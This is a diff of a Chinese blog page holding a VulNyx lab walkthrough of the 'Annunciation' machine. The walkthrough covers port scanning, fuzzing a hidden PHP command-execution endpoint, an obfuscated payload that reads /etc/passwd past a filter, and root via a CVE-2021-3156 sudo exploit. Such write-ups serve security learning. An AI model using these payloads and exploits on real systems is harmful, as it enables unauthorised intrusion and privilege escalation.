@@ -261,15 +261,15 @@
 
           
           
+          
+          
           <li>
-            <a href="/about/">
+            <a href="/archives/">
               
-              关于
+              归档
               
             </a>
           </li>
-          
-          
           
           
           
@@ -294,9 +294,9 @@
           
           
           <li>
-            <a href="/archives/">
+            <a href="/about/">
               
-              归档
+              关于
               
             </a>
           </li>
@@ -402,9 +402,9 @@
           <div class="post-heading">
             <div class="tags">
               
-              <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
-              
               <a class="tag" href="/tags/#文件包含" title="文件包含">文件包含</a>
+              
+              <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
               
               <a class="tag" href="/tags/#Shell" title="Shell">Shell</a>
               
@@ -493,7 +493,8 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1 id="Annunciation"><a href="#Annunciation" class="headerlink" title="Annunciation"></a>Annunciation</h1><p>靶机ip:192.168.108.136</p>
+        <h1>Annunciation</h1>
+<p>靶机ip:192.168.108.136</p>
 <p>攻击机ip:192.168.108.50</p>
 <p>靶机地址：<a target="_blank" rel="noopener" href="https://vulnyx.com/">https://vulnyx.com/</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ <span class="built_in">export</span> ip=192.168.108.136</span><br><span class="line">Kal ddddx ~ ❯ nmap <span class="variable">$ip</span> -A -O -p-                                                                      ✘ INT at 07:59:58</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 08:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.108.136</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65387 filtered tcp ports (no-response), 146 filtered tcp ports (host-prohibited)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 3b:a9:30:f4:e2:10:b4:3b:2e:a4:db:32:9a:b9:8b:80 (RSA)</span><br><span class="line">|   256 76:f3:48:b4:53:4a:be:95:44:00:16:81:1e:f2:2e:68 (ECDSA)</span><br><span class="line">|_  256 37:07:9a:8d:e0:3b:bc:39:8f:2f:6e:36:81:89:db:2d (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="number">5.4</span>.<span class="number">16</span>)</span><br><span class="line">|_http-title: Apache HTTP Server Test Page powered by CentOS</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">6</span> (CentOS) PHP/<span class="number">5.4</span>.<span class="number">16</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">1</span>C:F8:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Aggressive OS guesses: Linux <span class="number">3.10</span> - <span class="number">4.11</span> (<span class="number">97</span>%), Linux <span class="number">3.2</span> - <span class="number">4.14</span> (<span class="number">97</span>%), Linux <span class="number">5.1</span> - <span class="number">5.15</span> (<span class="number">97</span>%), Linux <span class="number">3.13</span> - <span class="number">3.16</span> (<span class="number">91</span>%), Linux <span class="number">3.13</span> - <span class="number">4.4</span> (<span class="number">91</span>%), Linux <span class="number">3.16</span> - <span class="number">4.6</span> (<span class="number">91</span>%), Linux <span class="number">3.8</span> - <span class="number">3.16</span> (<span class="number">91</span>%), Linux <span class="number">4.10</span> (<span class="number">91</span>%), Linux <span class="number">4.4</span> (<span class="number">91</span>%), OpenWrt <span class="number">19.07</span> (Linux <span class="number">4.14</span>) (<span class="number">91</span>%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.04</span> ms <span class="number">192.168</span>.<span class="number">108.136</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">155.17</span> seconds</span><br></pre></td></tr></table></figure>
@@ -515,7 +516,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:W1 -w /usr/share/seclists/Discovery/Web-Content/common.txt:W2 -u http://192.168.108.136/.dev/debugger.php -X POST -d <span class="string">&quot;W1=whoami&amp;W2=test&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -mc 500 -t 3000</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : POST</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.108.136/.dev/debugger.php</span></span><br><span class="line"><span class="string"> :: Wordlist         : W1: /usr/share/seclists/Discovery/Web-Content/common.txt</span></span><br><span class="line"><span class="string"> :: Wordlist         : W2: /usr/share/seclists/Discovery/Web-Content/common.txt</span></span><br><span class="line"><span class="string"> :: Header           : Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"> :: Data             : W1=whoami&amp;W2=test</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 3000</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 500, Size: 53, Words: 7, Lines: 3, Duration: 144ms]</span></span><br><span class="line"><span class="string">    * W1: cmd</span></span><br><span class="line"><span class="string">    * W2: access</span></span><br></pre></td></tr></table></figure>
 <p>尝试上传指令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ curl -X POST http://192.168.108.136/.dev/debugger.php -d <span class="string">&quot;cmd=whoami&amp;access=id&quot;</span>               at 14:24:17</span><br><span class="line">Parameter 1 (access): di</span><br><span class="line">Parameter 2 (cmd): <span class="built_in">whoami</span></span><br><span class="line">Kal ddddx ~ ❯ curl -X POST http://192.168.108.136/.dev/debugger.php -d <span class="string">&quot;cmd=id&amp;access=whoami&quot;</span>  at 14:24:36</span><br><span class="line">Parameter 1 (access): imaohw</span><br><span class="line">Parameter 2 (cmd): <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-<p><code>access=whoami</code> 被解析为 <code>imaohw</code>，<strong>值被反转了，</strong>同时 <code>cmd=id</code> 没有被执行，将输入的指令替换成php语言的反转一下再发送，状态码变为200说明执行成功，可以推断出服务器代码可能包含一段逻辑，大致像这样</p>
+<p><code>access=whoami</code> 被解析为 <code>imaohw</code>，**值被反转了，**同时 <code>cmd=id</code> 没有被执行，将输入的指令替换成php语言的反转一下再发送，状态码变为200说明执行成功，可以推断出服务器代码可能包含一段逻辑，大致像这样</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;access&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$reversed_access</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;access&#x27;</span>]); <span class="comment">// 反转access参数</span></span><br><span class="line">    <span class="variable">$reversed_access</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);            <span class="comment">// 将反转后的access作为函数名,cmd作为参数执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="%E5%9B%BE%E7%89%87%204.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%205.png" alt="图片.png"></p>
@@ -526,7 +527,7 @@
 <p>执行命令并<strong>直接输出到页面</strong>（适合用来查看命令行输出）</p>
 <p><code>shell_exec()</code></p>
 <p>执行命令并<strong>返回完整输出为字符串</strong></p>
-<p> <code>system()</code></p>
+<p><code>system()</code></p>
 <p>执行命令并<strong>立即输出每行内容</strong>，也可以返回最后一行</p>
 <p><code>backticks（反引号）</code></p>
 <p>这是一种 PHP 语法糖，和 <code>shell_exec()</code> 类似</p>
@@ -536,11 +537,12 @@
 <p><img src="%E5%9B%BE%E7%89%87%206.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%207.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%208.png" alt="图片.png"></p>
-<p>尝试base64加密绕过没效果，使用使用 <code>cat</code> + <code>$(...)</code> 混淆<br>绕过目标<strong>/etc/passwd</strong></p>
+<p>尝试base64加密绕过没效果，使用使用 <code>cat</code> + <code>$(...)</code> 混淆<br>
+绕过目标**/etc/passwd**</p>
 <p>怀疑/被过滤，常规为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat $(<span class="keyword">echo</span> .etc.passwd | tr <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p><code>echo .etc.passwd</code> ➜ 输出 <code>.etc.passwd</code></p>
-<p><code>tr &#39;.&#39; &#39;/&#39;</code> ➜ 替换成 <code>/etc/passwd</code></p>
+<p><code>tr '.' '/'</code> ➜ 替换成 <code>/etc/passwd</code></p>
 <p><code>cat $(...)</code> ➜ 实际执行：<code>cat /etc/passwd</code></p>
 <p>这里使用tr映射的方法，选取两个范围一致的字符集将 . 和 / 对应起来</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access=urhtssap&amp;cmd=cat $(<span class="keyword">echo</span> .etc.passwd | tr <span class="string">&#x27;,-0&#x27;</span> <span class="string">&#x27;--1&#x27;</span>)</span><br></pre></td></tr></table></figure>
@@ -569,7 +571,7 @@
 <p>发现可以 <strong><code>sudo</code> 执行 <code>/usr/sbin/findfs</code>，且无需密码（<code>NOPASSWD</code>）</strong><code>findfs</code> 可能会触发底层工具如 <code>blkid</code> 或尝试挂载可以结合恶意文件系统镜像,但无法自动挂载手动又没权限，无果</p>
 <p>查看sudo版本发现sudo版本过低，存在<strong>CVE-2021-3156</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(remote) trumpeter@annunciation:/tmp$ <span class="built_in">sudo</span> --version</span><br><span class="line">Sudo version 1.8.23</span><br><span class="line">Sudoers policy plugin version 1.8.23</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.23</span><br></pre></td></tr></table></figure>
-<p>去github上拿个exp<a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156,得到提权用户">https://github.com/worawit/CVE-2021-3156,得到提权用户</a></p>
+<p>去github上拿个exphttps://github.com/worawit/CVE-2021-3156,得到提权用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(remote) trumpeter@annunciation:/tmp$ vi run.py</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/trumpeter</span><br><span class="line">(remote) trumpeter@annunciation:/tmp$ python run.py</span><br><span class="line">.....</span><br><span class="line">(remote) trumpeter@annunciation:/tmp$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">...</span><br><span class="line">gg:$5$a<span class="variable">$gemgwVPxLx</span>/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash</span><br><span class="line">(remote) trumpeter@annunciation:/tmp$ su gg</span><br><span class="line">Password:</span><br><span class="line">(remote) root@annunciation:/tmp# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">(remote) root@annunciation:/home# <span class="built_in">cd</span> /root/</span><br><span class="line">(remote) root@annunciation:/root# <span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">(remote) root@annunciation:/root# <span class="built_in">cat</span> root.txt</span><br><span class="line">VulNyx&#123;3c84b473492b03c0eaeaa749d4d53d52&#125;</span><br></pre></td></tr></table></figure>
 
         <hr>
@@ -731,9 +733,9 @@
           </h5>
           <div class="tags">
             
-            <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
-            
             <a class="tag" href="/tags/#文件包含" title="文件包含">文件包含</a>
+            
+            <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
             
             <a class="tag" href="/tags/#Shell" title="Shell">Shell</a>
             
